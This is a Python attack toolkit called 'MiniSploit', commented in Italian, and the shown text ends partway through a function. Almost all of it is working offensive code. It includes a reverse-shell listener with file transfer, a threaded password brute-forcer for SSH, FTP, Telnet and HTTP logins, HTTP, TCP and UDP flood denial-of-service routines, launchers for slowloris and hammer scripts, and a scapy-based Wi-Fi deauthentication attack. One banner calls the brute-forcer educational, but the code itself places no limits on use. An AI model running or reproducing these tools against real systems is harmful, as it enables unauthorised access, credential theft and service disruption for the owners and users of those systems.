#!/usr/bin/env python3
import time
import sys
import subprocess
import socket
import os
import readline
import time, random
import threading
import pyfiglet
from colorama import Fore, Back, Style, init
from scapy.all import *
import concurrent.futures
import cmd
import queue
import paramiko
from ftplib import FTP
import requests


open_tcp = []
target = None

init(autoreset=True)

target = "0.0.0.0"
port = None
running = False

class ReverseShellListener:
    def __init__(self):
        self.LHOST = "0.0.0.0"
        self.LPORT = 4444
        self.conn = None
        self.addr = None
        self.active = False

    def set(self, option, value):
        if option.upper() == "LHOST":
            self.LHOST = value
        elif option.upper() == "LPORT":
            self.LPORT = int(value)
        else:
            print(f"\033[31m[-] Opzione sconosciuta: {option}")

    def options(self):
        print("\033[36m[+] Current settings: \033[0m")
        print(f"    LHOST = {self.LHOST}")
        print(f"    LPORT = {self.LPORT}")

    def run(self):
        s = socket.socket()
        try:
            s.bind((self.LHOST, self.LPORT))
            s.listen(1)
            print(f"\033[34m[*] In ascolto su {self.LHOST}:{self.LPORT}...")
            self.conn, self.addr = s.accept()
            self.active = True
            print(f"\033[34m[+] Connessione da {self.addr}")
            self.handle_client()
        except Exception as e:
            print(f"\033[31m[-] Errore: {e}")
            s.close()

    def handle_client(self):
        while True:
            cmd = input("(MiniSploit)/\033[33;4mreverse_shell \033[0m>  ").strip()
            if not cmd:
                continue

            if cmd == "exit":
                print("\033[31m[*] Disconnessione...")
                self.conn.close()
                self.active = False
                break
            elif cmd == "background":
                print("\033[35m[*] Sessione mandata in background!")
                break  # esce dal loop ma NON chiude connessione
            elif cmd.startswith("upload "):
                try:
                    filepath = cmd.split(" ", 1)[1]
                    with open(filepath, "rb") as f:
                        data = f.read()
                    self.conn.sendall(("upload " + os.path.basename(filepath)).encode())
                    self.conn.sendall(data + b"<EOF>")
                except Exception as e:
                    print("Errore upload:", e)
            elif cmd.startswith("download "):
                filename = cmd.split(" ", 1)[1]
                self.conn.send(cmd.encode())
                with open("recv_" + os.path.basename(filename), "wb") as f:
                    while True:
                        data = self.conn.recv(1024)
                        if b"<EOF>" in data:
                            f.write(data.replace(b"<EOF>", b""))
                            break
                        f.write(data)
                print(f"[+] File salvato come recv_{filename}")
            else:
                self.conn.send(cmd.encode())
                output = self.recv_output()
                print(output)

    def recv_output(self):
        """Riceve output completo senza dover ripetere 2 volte il comando"""
        self.conn.settimeout(0.5)
        chunks = []
        try:
            while True:
                data = self.conn.recv(4096)
                if not data:
                    break
                chunks.append(data)
        except socket.timeout:
            pass
        self.conn.settimeout(None)
        return b"".join(chunks).decode(errors="ignore")

# Sopprime gli avvisi SSL
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Importazione Colorama
try:
    from colorama import init as colorama_init, Fore, Style
    colorama_init(autoreset=True)
except ImportError:
    # Definizione dummy in caso colorama non sia installato
    class _Dummy:
        RESET_ALL = ""; RED = ""; GREEN = ""; YELLOW = ""; CYAN = ""; MAGENTA = ""; BLUE = ""
    Fore = Style = _Dummy()

# --- VARIABILI GLOBALI HTTP ---
HTTP_USER_FIELD = "username"
HTTP_PASS_FIELD = "password"
HTTP_ERROR_STRING = "Login failed"
HTTP_SUCCESS_STRING = "Welcome"
# -----------------------------

# =========================================================================
# CLASSE PRINCIPALE DELLA SHELL INTERATTIVA
# =========================================================================

class BruteForceShell(cmd.Cmd):
    
    # --- CONFIGURAZIONE CMD SHELL ---
    prompt = '(MiniSploit)/\033[55mbruteshell > \033[0m'
    intro = (
        f"{Fore.CYAN}--- Brute-Force Shell per Studio ---\n"
        f"Benvenuto! Studia l'interazione tra i protocolli.\n"
        f"⚠️ Ricorda: L'uso di questo tool è strettamente didattico e legale.\n"
        f"Digita 'help' o '?' per i comandi. {Style.RESET_ALL}\n"
    )

    # --- PARAMETRI DI STATO ---
    params = {
        "protocol": None,
        "threads": 10,
        "user_file": None,
        "pass_file": None,
        "host": None,
        "port": None,
        "url": None,
        "output": None,
        "verbose": False
    }

    # --- FUNZIONI WORKER (LE TUE ORIGINALI) ---
    # *Nota: Ho aggiunto un piccolo fix al Telnet worker per la stampa*
    
    def telnet_worker(self, host, port, user, passwd, output_file=None, verbose=False):
        try:
            # Pexpect spesso richiede un ambiente standard, a volte può fallire in cmd
            child = pexpect.spawn(f"telnet {host} {port}", timeout=5)
            child.expect("login: ")
            child.sendline(user)
            child.expect("Password: ")
            child.sendline(passwd)
            index = child.expect(["Login incorrect", pexpect.EOF, pexpect.TIMEOUT], timeout=5)
            
            if index != 0:
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Telnet SUCCESS {user}:{passwd}")
                if output_file:
                    with open(output_file, "a") as f:
                        f.write(f"{host}:{port}:Telnet:{user}:{passwd}\n")
            elif verbose:
                 print(f"{Fore.RED}[-]{Style.RESET_ALL} Telnet FAILED {user}:{passwd}")
                 
            child.close()
        except Exception as e:
            if verbose:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Telnet ERROR {user}:{passwd} -> {type(e).__name__}")
            pass

    def ftp_worker(self, host, port, user, passwd, output_file=None, verbose=False):
        try:
            ftp = FTP()
            ftp.connect(host, port, timeout=5)
            ftp.login(user, passwd)
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} FTP SUCCESS {user}:{passwd}")
            if output_file:
                with open(output_file, "a") as f:
                    f.write(f"{host}:{port}:FTP:{user}:{passwd}\n")
            ftp.quit()
        except Exception as e:
            if verbose:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} FTP FAILED {user}:{passwd}")
            pass

    def ssh_worker(self, host, port, user, passwd, output_file=None, verbose=False):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=host, port=port, username=user, password=passwd,
                timeout=10, allow_agent=False, look_for_keys=False
            )
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} SSH SUCCESS {user}:{passwd}")
            if output_file:
                with open(output_file, "a") as f:
                    f.write(f"{host}:{port}:SSH:{user}:{passwd}\n")
            client.close()
        except paramiko.ssh_exception.AuthenticationException:
            if verbose:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} SSH FAILED {user}:{passwd}")
        except Exception as e:
            if verbose:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} SSH ERROR {user}:{passwd} -> {type(e).__name__}")
        finally:
            time.sleep(random.uniform(5.0, 10.0))

    def http_worker(self, login_url, user, passwd, output_file=None, verbose=False):
        s = requests.Session()
        data = {
            HTTP_USER_FIELD: user,
            HTTP_PASS_FIELD: passwd,
            "Login": "Login" # Aggiunto come da tuo script originale (es. DVWA)
        }
        
        try:
            response = s.post(login_url, data=data, verify=False, timeout=8)
            content_lower = response.text.lower()
            
            if (HTTP_SUCCESS_STRING.lower() in content_lower and 
                HTTP_ERROR_STRING.lower() not in content_lower):
                
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} HTTP SUCCESS {user}:{passwd} | Status: {response.status_code}")
                if output_file:
                    with open(output_file, "a") as f:
                        f.write(f"{login_url}:HTTP:{user}:{passwd}\n")
                return True
            else:
                if verbose:
                    print(f"{Fore.RED}[-]{Style.RESET_ALL} HTTP FAILED {user}:{passwd}")
                return False

        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} HTTP ERROR {user}:{passwd} -> {type(e).__name__}")
            return False
        finally:
            time.sleep(random.uniform(0.5, 1.5))


    # --- FUNZIONE DI LANCIO MULTITHREADING (run_brute) ---

    def run_attack(self, users, passwords):
        proto = self.params["protocol"]
        threads = self.params["threads"]
        output_file = self.params["output"]
        verbose = self.params["verbose"]
        host = self.params["host"]
        port = self.params["port"]
        url = self.params["url"]
        
        combo_queue = queue.Queue()
        
        # Inserimento payload nella coda
        for u in users:
            for p in passwords:
                combo_queue.put((u, p))
                
        total_attempts = combo_queue.qsize()

        def worker():
            while True: 
                try:
                    u, p = combo_queue.get(timeout=5)
                except queue.Empty:
                    return
                
                # Stampa Verbose (solo se non gestita dal worker)
                if verbose and proto not in ["ssh", "http"]: # SSH/HTTP worker stampano già FAILED
                    print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Testing {proto.upper()} {u}:{p}...")
                    
                # Chiama il worker appropriato
                if proto == "telnet":
                    self.telnet_worker(host, port if port else 23, u, p, output_file, verbose)
                elif proto == "ftp":
                    self.ftp_worker(host, port if port else 21, u, p, output_file, verbose)
                elif proto == "ssh":
                    self.ssh_worker(host, port if port else 22, u, p, output_file, verbose)
                elif proto == "http":
                    self.http_worker(url, u, p, output_file, verbose)
                    
                combo_queue.task_done()

        # Avvio del processo
        print(f"{Fore.YELLOW}[INFO]{Style.RESET_ALL} Avvio {threads} thread per {proto.upper()} ({total_attempts} tentativi totali)...")
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        # Attesa completamento
        combo_queue.join()
        print(f"{Fore.MAGENTA}[DONE]{Style.RESET_ALL} Attacco {proto.upper()} completato. Tempo di studio finito. 👍")


    # =========================================================================
    # --- COMANDI DELLA SHELL (I tuoi comandi `brute>`) ---
    # =========================================================================

    def do_exit(self, arg):
        """Esci dalla shell."""
        print("Arrivederci! Buon studio! 👋")
        return True

    def do_quit(self, arg):
        """Alias per 'exit'."""
        return self.do_exit(arg)

    def do_use(self, line):
        """Seleziona il protocollo: use [ssh|ftp|telnet|http]"""
        protocol = line.strip().lower()
        if protocol in ["ssh", "ftp", "telnet", "http"]:
            self.params["protocol"] = protocol
            
            # Imposta porta di default per i protocolli TCP
            if protocol == "ssh": self.params["port"] = 22
            elif protocol == "ftp": self.params["port"] = 21
            elif protocol == "telnet": self.params["port"] = 23
            
            print(f"Protocollo selezionato: {protocol.upper()} 🚀")
            self.prompt = f'({protocol.upper()})> '
            self.do_show(None)
        else:
            print(f"{Fore.RED}Errore: Protocollo non valido. Usa: ssh, ftp, telnet o http.{Style.RESET_ALL}")
            
    def do_set(self, line):
        """Imposta un parametro: set [parametro] [valore]"""
        try:
            param, value = line.split(maxsplit=1)
            param = param.lower()
            
            if param == "verbose":
                self.params[param] = value.lower() in ('true', '1', 't', 'y', 'on')
            elif param == "threads":
                 self.params[param] = max(1, int(value)) # Almeno 1 thread
            elif param == "port":
                 self.params[param] = int(value)
            elif param in self.params:
                self.params[param] = value
            else:
                print(f"{Fore.RED}Errore: Parametro '{param}' non riconosciuto. {Style.RESET_ALL}")
            
            print(f"✅ Impostato {param} = {self.params[param]}")
        except ValueError:
            print(f"{Fore.RED}Errore: Usa il formato 'set <parametro> <valore>'.{Style.RESET_ALL}")
        except IndexError:
             print(f"{Fore.RED}Errore: Devi specificare sia il parametro che il valore.{Style.RESET_ALL}")
        except KeyError as d:
             print(f"[KeyError] {d}")

    def do_show(self, arg):
        """Mostra i parametri attuali."""
        print("\n" + "="*45)
        print("  PARAMETRI ATTUALI (Obbligatori*) ")
        print("="*45)
        print("  PROTOCOLLI (http, ssh, ftp, telnet)")
        print("="*45)
        for key, value in self.params.items():
            required_marker = ""
            if key == "user_file" or key == "pass_file": required_marker = "*"
            elif (key == "host" or key == "port") and self.params["protocol"] in ["ssh", "ftp", "telnet"]: required_marker = "*"
            elif key == "url" and self.params["protocol"] == "http": required_marker = "*"
            
            print(f"  {key:<12}{required_marker}: {Fore.BLUE}{value}{Style.RESET_ALL}")
        print("="*35 + "\n")
        
    def do_run(self, arg):
        """Avvia l'attacco con i parametri impostati."""
        
        # 1. Controlla il protocollo
        proto = self.params["protocol"]
        if not proto:
            print(f"{Fore.RED}❌ ERRORE: Seleziona un protocollo prima di avviare, es: 'use ssh'.{Style.RESET_ALL}")
            return

        # 2. Controlla i parametri richiesti
        if not self.params["user_file"] or not self.params["pass_file"]:
            print(f"{Fore.RED}❌ ERRORE: Devi specificare user_file e pass_file (set user_file ...).{Style.RESET_ALL}")
            return
            
        if (proto in ["ssh", "ftp", "telnet"]) and (not self.params["host"]):
             print(f"{Fore.RED}❌ ERRORE: Devi specificare l'HOST (set host ...).{Style.RESET_ALL}")
             return
             
        if (proto == "http") and (not self.params["url"]):
             print(f"{Fore.RED}❌ ERRORE: Devi specificare l'URL (set url ...).{Style.RESET_ALL}")
             return

        # 3. Carica i file
        try:
            with open(self.params["user_file"], "r", encoding='latin-1', errors='ignore') as f:
                users = [line.strip() for line in f if line.strip()]
            with open(self.params["pass_file"], "r", encoding='latin-1', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError as e:
            print(f"{Fore.RED}❌ ERRORE: File di wordlist non trovato: {e}{Style.RESET_ALL}")
            return
            
        if not users or not passwords:
            print(f"{Fore.RED}❌ ERRORE: Wordlist utente/password vuote.{Style.RESET_ALL}")
            return

        # 4. Avvia l'attacco reale
        self.run_attack(users, passwords)

def attacco_web_flood(host, porta, payload):
    """Esegue l'attacco HTTP Flood in un loop infinito."""
    thread_name = threading.current_thread().name
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5) 
            s.connect((host, porta))
            s.sendall(payload) # Invia la richiesta HTTP
            s.close()
            print(f"[{thread_name}] Richiesta HTTP inviata a {host}:{porta}")
        except:
            # Ignoriamo l'errore per non intasare la console con 300 thread
            pass

# =================================================================
# 2. FUNZIONE MENU (Il Cuore del Programma)
# =================================================================
def menu_dos():
    host = None
    port = None
    sock = None
    byte = 1024 
    pacchetti = 1 
    threads = 100 # ⭐ Variabile per il conteggio dei thread
    
    while True:
        
        cmd = input(f"(DoS) > ")

        if cmd.startswith("host"):
            try:
                host = cmd.split()[1]
                print(f"[+] HOST impostato a {host}")
            except IndexError:
                print("[-] Devi specificare un host. Esempio: host 192.168.1.1")

        elif cmd.startswith("pacc"):
            try:
                pacchetti = int(cmd.split()[1]) 
                print(f"[+] PACCHETTI impostati a {pacchetti}")
            except (IndexError, ValueError):
                print("[-] Devi specificare un numero di pacchetti valido.")

        elif cmd.startswith("port"):
            try:
                port = int(cmd.split()[1])
                print(f"[+] PORTA impostata a {port}")
            except (IndexError, ValueError):
                print("[-] Devi specificare una porta numerica. Esempio: port 80")

        elif cmd.startswith("byte"):
            try:
                byte = int(cmd.split()[1])
                print(f"[+] BYTE impostati a {byte}")
            except (IndexError, ValueError):
                print("[-] Devi specificare un valore numerico per i byte.")
        
        elif cmd.startswith("thread"):
            try:
                threads = int(cmd.split()[1])
                print(f"[+] THREADS impostati a {threads}")
            except (IndexError, ValueError):
                print("[-] Devi specificare un numero di thread valido.")

        elif cmd == "show":
            print(f"""
SHOW 📊

Byte    - {byte}
Host    - {host}
Port    - {port}
Pacc    - {pacchetti}
Threads - {threads}
""")

        elif cmd == "help":
            print(f"""
Help: ❓
- run     - (Avvia attacco TCP a pacchetti fissi)
- runUDP  - (avvio attacco UDP continuo)
- runWEB  - (avvio attacco HTTP Flood con thread)
- byte    - (seleziona byte)
- host    - (seleziona un host)
- port    - (seleziona una porta)
- pacc    - (imposta numero di pacchetti per 'run') 
- thread  - (imposta numero di thread per 'runWEB')
- exit    - (esci)
- show    - (vedi opzioni)
""") 

        # -----------------------------------------------------------------
        # 2.1 COMANDO run (TCP a pacchetti fissi)
        # -----------------------------------------------------------------
        elif cmd == "run":
            if host and port and byte and pacchetti:
                sock = None 
                try:
                    print(f"[+] Tentativo di connessione a {host}:{port}...")
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3) 
                    sock.connect((host, port))
                    
                    # ⭐ Payload HTTP qui. Nota: Questo attacco è molto lento e inefficiente.
                    payload_http = b'GET / HTTP/1.1\r\nHost: ' + host.encode() + b'\r\n\r\n'
                    print(f"[+] Connessione stabilita. Invio di {pacchetti} richieste HTTP/TCP...")

                    for i in range(1, pacchetti + 1):
                        # Se è TCP connesso, USI SOLO sock.send()
                        # Nota: Se vuoi inviare solo i byte casuali: sock.send(os.urandom(byte))
                        sock.send(payload_http)
                        print(f"[*] Richiesta inviata: {i}/{pacchetti}") 

                    print(f"[+] Invio completato.")

                except KeyboardInterrupt:
                    print("\n[!] Attacco interrotto dall'utente.")
                except Exception as e:
                    print(f"[-] Errore: {e}")
                
                finally:
                    if sock:
                        sock.close()
                        print("[+] Connessione chiusa.")
            else:
                print("[-] Parametri necessari non impostati. Usa 'show'.")
        
        # -----------------------------------------------------------------
        # 2.2 COMANDO runWEB (HTTP Flood con Threading)
        # -----------------------------------------------------------------
        elif cmd == "runWEB": 
            if host and port and threads:
                print(f"[+] Avvio attacco HTTP Flood su {host}:{port} con {threads} thread...")
                print("[+] Premi CTRL+C per fermare TUTTI i thread! 💥")
                
                # 1. Crea il payload una sola volta
                payload = b'GET / HTTP/1.1\r\nHost: ' + host.encode() + b'\r\n\r\n'
                
                # 2. Avvia i thread
                for i in range(threads):
                    # ⭐ Qui usa la funzione attacco_web_flood che è definita sopra
                    t = threading.Thread(target=attacco_web_flood, args=(host, port, payload))
                    t.daemon = True 
                    t.start()
                    # Per evitare di inondare la console, non stampiamo qui

                # 3. Metti il thread principale in attesa (loop infinito)
                try:
                    while True:
                        pass 
                except KeyboardInterrupt:
                    print("\n[!] Attacco interrotto dall'utente (CTRL+C). I thread sono stati terminati.")
            
            else:
                print("[-] Parametri Host, Port e Threads necessari. Usa 'show'.")

        # -----------------------------------------------------------------
        # 2.3 COMANDO runUDP (UDP Flood continuo)
        # -----------------------------------------------------------------
        elif cmd == "runUDP":
            if host and port and byte:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    print(f"[+] Avvio invio pacchetti UDP a {host}:{port} (CTRL+C per interrompere) 💥")

                    i = 0 
                    while True: 
                        dati_casuali = os.urandom(byte)
                        
                        i += 1 
                        sock.sendto(dati_casuali, (host, port)) 
                        
                        if i % 1000 == 0: 
                            print(f"[+] Pacchetti inviati: {i}")

                except KeyboardInterrupt:
                    print("\n[!] Attacco interrotto dall'utente.")
                except Exception as e:
                    print(f"[-] Errore nell'invio: {e}")
                
                finally:
                    if sock:
                        sock.close()
                        print("[+] Socket chiuso.")
            else:
                print("[-] Parametri mancanti.")

        # -----------------------------------------------------------------
        # 2.4 COMANDO exit
        # -----------------------------------------------------------------
        elif cmd == "exit":
            print("[!] Uscita dal programma.")
            sys.exit(0)
            
        else:
            print("Comando sconosciuto")

def slowdos():
    host = None
    port = None
    while True:
        cmd = input("SlowLoris > ")
         
        if cmd.startswith("host"):
            host = cmd.split()[1]
            
        elif cmd.startswith("port"):
            port = cmd.split()[1]
            
        elif cmd == "exit":
            break
          
        elif cmd == "show":
            print(f"""
Show 
=========
slowloris.py -p {port} {host}
""")
  
        elif cmd == "start":
            try:
                com = f"python3 /home/kali/Scrivania/FULL/Malware/ATTACK/slowloris.py -p {port} {host}"
                subprocess.run(com, shell=True)
            except Exception as d:
                print(f"Error: {d}")
                
def hammer():
    host = None
    port = None
    turbo = None
    while True:
    
        cmd = input("Hammer > ")
        
        if cmd.startswith("host"):
            host = cmd.split()[1]
    
        elif cmd.startswith("port"):
            port = cmd.split()[1]
            
        elif cmd.startswith("turbo"):
            turbo = cmd.split()[1]
            
        elif cmd == "start":
            try:
                com = f"python3 /home/kali/Scrivania/FULL/Malware/ATTACK/hammer.py -t {turbo} -p {port} -s {host}"
                subprocess.run(com, shell=True)
            except Exception as e:
                print(f"[Error] {e}")
                
        elif cmd == "exit":
            break
            
        elif cmd == "show":
            print(f"""
Comando 
=======
hammer -s {host} -p {port} -t {turbo}
""")

        elif cmd == "help":
            print(f"""
Help
=====
- port <port>
- turbo <turbo> (velocita)
- host <host>
- start (avvia)
- exit 
- show (vedi comando)
""")    
    
def main():
    listener = ReverseShellListener()
    while True:
        cmd = input("(MiniSploit)/\033[36;4mListener \033[0m> ").strip()
        if not cmd:
            continue
        elif cmd.lower() in ("run", "exploit", "start", "listen"):
            listener.run()
        elif cmd.upper().startswith("SET "):
            parts = cmd.split(" ", 2)
            if len(parts) == 3:
                listener.set(parts[1], parts[2])
            else:
                print("\033[31m[-] Comando SET non valido")
        elif cmd.lower() == "options":
            listener.options()
        elif cmd.lower() == "sessions":
            if listener.active:
                print(f"[+] 1   session active from {listener.addr}")
            else:
                print("[-] Nessuna sessione attiva")
        elif cmd.lower().startswith("sessions -i"):
            if listener.active and listener.conn:
                print(f"[*] Rientrando nella sessione {listener.addr}...")
                listener.handle_client()
            else:
                print("[-] Nessuna sessione disponibile")
        elif cmd.lower() == "exit":
            print("[*] Uscita dal listener")
            break
        else:
            print("\033[31m[-] Comando sconosciuto")

def menu2():
    target = None
    localp = None
    count2 = None

    while True:
           cmd = input(f"(MiniSploit)/\033[31;4mDos\033[0m > ")
          
           if cmd.startswith("target"):
                 target = cmd.split()[1]
           elif cmd == "exit":
                 break
         
           elif cmd == "options":
                 print(f"""
OPTIONS
- TARGET: {target}
- PORT:   {localp} 
- COUNT:  {count2}
""")
           elif cmd.startswith("localp"):
                 localp = int(cmd.split()[1])

           elif cmd.startswith("count2"):
                 count2 = int(cmd.split()[1])
           elif cmd == "help":
                 print(f"""
HELP:
- target <ip>
- localp  <port>
- count2 <count>
- exit 
- help 
- run
""")
           elif cmd in ["run", "start"]:
               if not target or not localp or not count2:
                   print("Devi prima impostare target, localp e count2!")
                   continue
               print("Connessione stabilita. Inizio attacco...")
               try:
                   for i in range(count2):
                       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                       s.connect((target, int(localp)))
                       s.send(os.urandom(1024))
                       print(f"[{i+1}/{count2}] Pacchetto inviato a {target}:{localp}")
                       s.close()
                       time.sleep(0.1)
               except Exception as e:
                   print(f"Errore invio pacchetto: {e}")
           else:
               print("comando non trovato. Digita 'help' per info")
def menu():
    host = None
    porting = None
    
    while True:
        cmd3 = input("(MiniSploit)/\033[35;4mausiliary\033[0m > ")
        
        if cmd3.startswith("host"):
            try:
                host = cmd3.split()[1]
            except IndexError:
                print("[-] DEVI IMPOSTARE UN HOST VALIDO")
        
        elif cmd3 == "start":
            if host:
              response = os.system(f"ping -c 2 {host} > /dev/null 2>&1")
              if response == 0: 
                  print("[+] HOST ATTIVO")
              else:
                  print("[-] HOST NON ATTIVO")
            else:
                 print("[-] Host non raggiungibile. Usa host <ip> prima di 'start'")
           
        elif cmd3 == "runsock":
            if host and porting:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((host, porting))
                except Exception as e:
                    print(f"Error: HOST NON RAGGIUNGIBILE {e}")
                else:
                    print(f"[+] HOST RAGGIUNGIBILE")
            else:
                print("[-] HOST NON RAGGIUNGIBILE")
              
        elif cmd3.startswith("porting"):
               try:
                   porting = int(cmd3.split()[1])
               except(IndexError, ValueError):
                   print("[-] imposta una porta valida")
              
        elif cmd3 == "exit":
          break     
           
        elif cmd3 == "options":
          print(f"""
OPTIONS:
HOST =  {host}
PORT =  {porting}
""")

        elif cmd3 == "help":
          print(f"""
Usage - 
- host <ip>
- porting <port>
- start <ping test>
- runsock <sock test>
- exit       
""")             
        else:
            print("Comando non trovato")

def Denial():
    mac_target = None
    router_bssid = None 
    interface = None 
    num_packets = 100
    wifi_channel = None 
     
    while True:
        cmd = input(f"(MiniSploit)/\033[35;4mMacATTACK > \033[0m")
         
        if cmd.startswith("target"):
            try:
                mac_target = cmd.split()[1]
                print(f"\033[34[+]\033[0m Target => {mac_target}")
            except IndexError:
                print("\033[31m[-]\033[0m Devi impostare un target valido")
                 
        elif cmd.startswith("bssid"):
            try:
                router_bssid = cmd.split()[1]
                print(f"\033[34[+]\033[0m BSSID =>{router_bssid}")
            except IndexError:
                print(f"\033[31m[-]\033[0m Devi impostare un BSSID valido")
                 
        elif cmd.startswith("interface"):
            try:
                interface = cmd.split()[1]
                print(f"\033[34[+]\033[0m Interfaccia => {interface}")
            except IndexError:
                print(f"\033[34m[-]\033[0m Devi impostare un interfaccia valida")
                 
        elif cmd.startswith("pacchetti"): # ⬅️ Usa 'startswith' per prendere l'argomento!
            try:
                # 🛠️ CORREZIONE CRUCIALE: Converti a intero e assegna a 'num_packets'
                num_packets = int(cmd.split()[1])
                print(f"\033[34[+]\033[0m Numero di pacchetti impostato su: {num_packets} 🎉")
            except (IndexError, ValueError): # Cattura anche se non è un numero valido
                print(f"\033[31m[-]\033[0m Devi impostare un numero intero valido di pacchetti (es. pacchetti 500)")
                 
        elif cmd.startswith("channel"): 
            try:
                channel = cmd.split()[1]
                # Tentiamo di convertire in intero e assegnare
                wifi_channel = int(channel)
                print(f"\033[34m[+]\033[0m Canale => {wifi_channel} 📡")
            except (IndexError, ValueError):
                print(f"\033[31m[-]\033[0m Devi impostare un numero di canale valido (es. channel 6)")
        
        elif cmd == "start":
            # 1. Verifica che i parametri obbligatori siano impostati
            if not mac_target or not router_bssid or not interface or not wifi_channel: # ⬅️ Aggiungi la verifica del canale
                print(f"\033[31m[-]\033[0m ERRORE: Devi impostare target, bssid, interface E channel prima di avviare l'attacco.")
                continue

            # --- ESECUZIONE DEL BLOCCO CANALE (STEP CRUCIALE!) ---
            try:
                channel_cmd = f"iwconfig {interface} channel {wifi_channel}"
                print(f"[*] Blocco dell'interfaccia sul canale {wifi_channel}...")
                
                # Esegui il comando iwconfig. Devi essere root per farlo!
                subprocess.run(channel_cmd, shell=True, check=True, capture_output=True)
                
            except subprocess.CalledProcessError as e:
                print(f"[-] ERRORE: Impossibile impostare il canale con iwconfig (Serve l'interfaccia in monitor mode?): {e.stderr.decode()}")
                continue
            
            # --- CONTINUAZIONE DELL'ATTACCO SCAPY ---
            count = num_packets
            print(f"[+] Blocco canale OK. Avvio dell'attacco Deauth su {mac_target} (Invio di {count} pacchetti)...")

            # ... la logica di Scapy per la costruzione e l'invio del pacchetto resta la stessa ...
            # ... (omessa qui per brevità, ma usa la logica che ti ho dato prima!) ...
            
            try:
                # ... Costruzione del Pacchetto ...
                dot11_frame = Dot11(addr1=mac_target, addr2=router_bssid, addr3=router_bssid, type=0, subtype=12)
                deauth_layer = Dot11Deauth(reason=7)
                radio_layer = RadioTap()
                packet = radio_layer / dot11_frame / deauth_layer
                
                # Iniezione dei Pacchetti
                sendp(packet, iface=interface, count=count, inter=0.1, verbose=False)
                 
                print(f"[+] Attacco completato! {count} pacchetti Deauth inviati. ✅")

            except Exception as e:
                print(f"[-] ERRORE DURANTE L'INIEZIONE: {e}")
                print("[-] Assicurati che l'interfaccia sia in modalità monitor (es: wlan0mon).")
                 
        elif cmd == "options":
            print(f"""
OPTIONS:

target  =>  {mac_target}
bssid   =>  {router_bssid}
interface => {interface}
pacchetti => {num_packets}
""")
     
        elif cmd == "help":
            print(f"""
USAGE:

target [MAC]
bssid [BSSID]
interface [IFACE_MON]
pacchetti [NUMERO]
start / exit / options
""")

        elif cmd == "exit":
            break


def nc():
    hosting = "0.0.0.0"
    port = None

    while True:
        cmd = input("(MiniSploit)/\033[35;4mNC\033[0m > ").strip()

        if cmd.startswith("hosting "):
            try:
                hosting = cmd.split()[1]
                print(f"LHOST => {hosting}")
            except IndexError:
                print("[-] Devi specificare un host valido")

        elif cmd.startswith("port "):
            try:
                port = int(cmd.split()[1])
                print(f"LPORT => {port}")
            except (IndexError, ValueError):
                print("[-] Devi specificare una porta valida")
                
        elif cmd == "help":
            print("""
USAGE:
- hosting <ip>
- port <port>
- exit
- help 
- start
""")    
       

        elif cmd == "options":
            print(f"""
Opzioni correnti:
HOST = 0.0.0.0
PORT = {port if port else 'non impostata'}
""")

        elif cmd == "start":
            if not hosting or not port:
                print(f"\033[31m[-] Devi impostare prima host e port\033[0m")
                continue

            print(f"\033[32m[+] In ascolto su {hosting}:{port} ...\033[0m")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((hosting, port))
            s.listen(1)
            conn, addr = s.accept()
            print(f"\033[34m[+] Connessione da {addr[0]}:{addr[1]} \033[0m")
            
            try:
                while True:
                    user_cmd = input("(MiniSploit)/\033[36mcmd> \033[97m")
                    if user_cmd.lower() == "exit":
                        conn.sendall(user_cmd.encode("utf-8"))
                        break

                    conn.sendall(user_cmd.encode("utf-8"))

                    # riceve output fino a <EOF>
                    data = b""
                    while b"<EOF>" not in data:
                        part = conn.recv(4096)
                        if not part:
                            break
                        data += part
                    print(data.replace(b"<EOF>", b"").decode("utf-8", errors="replace"))
            except Exception as e:
                print(f"[-] Errore: {e}")
            finally:
                conn.close()
                print(f"\033[31m[-] Connessione chiusa\033[0m")

        elif cmd == "exit":
            print("Uscita...")
            break

        else:
            print("[-] Comando non valido (usa: help per info")

def mega_menu():
    HOST = "0.0.0.0"
    PORT = None

    def handle_client(client_socket, addr):
        print(f"[+] Connessione da {addr[0]}:{addr[1]}")
        try:
            while True:
                cmd = input(f"(MiniSploit)/\033[34;4mcmd> \033[97m").strip()
                if not cmd:
                    continue
                client_socket.sendall(cmd.encode())
                if cmd.lower() == "exit":
                    break

                # Ricezione output fino a <EOF>
                data = b""
                while True:
                    chunk = client_socket.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if b"<EOF>" in chunk:
                        break
                print(data.replace(b"<EOF>", b"").decode(errors="ignore"))
        finally:
            client_socket.close()
            print("[+] Connessione chiusa")

    def start_listener():
        if not HOST or not PORT:
            print("[-] Devi impostare HOST e PORT prima di start")
            return
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            server.bind((HOST, PORT))
            server.listen(5)
            print(f"[+] Listening su {HOST}:{PORT} ...")
            while True:
                client_socket, addr = server.accept()
                thread = threading.Thread(target=handle_client, args=(client_socket, addr))
                thread.start()
        except Exception as e:
            print(f"[-] Errore: {e}")
        finally:
            server.close()

    while True:
        cmd = input(f"(MiniSploit)/\033[34;4mmega \033[0m> ").strip()
        if cmd.startswith("target"):
            HOST = cmd.split()[1]
